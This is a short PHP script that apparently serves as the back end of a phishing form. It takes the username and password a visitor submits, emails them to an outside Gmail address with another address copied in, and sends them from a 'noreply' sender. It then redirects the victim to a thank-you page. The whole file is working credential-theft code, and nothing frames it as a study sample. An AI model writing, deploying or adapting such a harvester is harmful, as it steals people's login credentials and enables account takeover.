<?php	
//get data from form  
$username = $_POST['username'];
$password= $_POST['password'];

$to = "dookamijp@gmail.com";
$subject = "details";
$txt ="Username: ". $username . "\r\n Password: ". $password;
$headers = "From: noreply@evalyngit.com" . "\r\n" .
"CC: thaiwonderworks@gmail.com";
if($password!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>